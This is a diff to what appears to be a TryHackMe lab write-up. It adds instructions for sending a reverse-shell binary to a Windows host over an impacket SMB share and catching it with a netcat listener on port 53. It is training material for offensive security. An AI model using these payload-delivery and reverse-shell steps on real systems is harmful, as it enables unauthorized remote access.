@@ -59,6 +59,24 @@ We need to know our ipv4 address on the tryhackme VPN before we can craft our re
 
 ### Transfering reverse.exe Via SMB (The authors way)
 
+Using the smb server from the impacket tool kit, from kali linux the following command can spin up an SMB share in the current directory with the following command:
+
+`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+
+Then from the windows 10 RDP session, in a cmd terminal the copy command can be used to get a file from our SMB kali share:
+
+`copy\\<kali ip>\kali\<file> <writable path on Windows>`  
+
+![image](https://user-images.githubusercontent.com/83407557/181866236-da7538f9-95c2-42a2-a948-8f914f7ef448.png)
+
+To test that it worked, start a netcat listener on port 53 and test the binary.
+
+![image](https://user-images.githubusercontent.com/83407557/181866273-128d0611-d2b5-415c-9851-7a7548a9ef6c.png)
+
+### Transfering reverse.exe Via HTTP
+
+
+
 
 
 
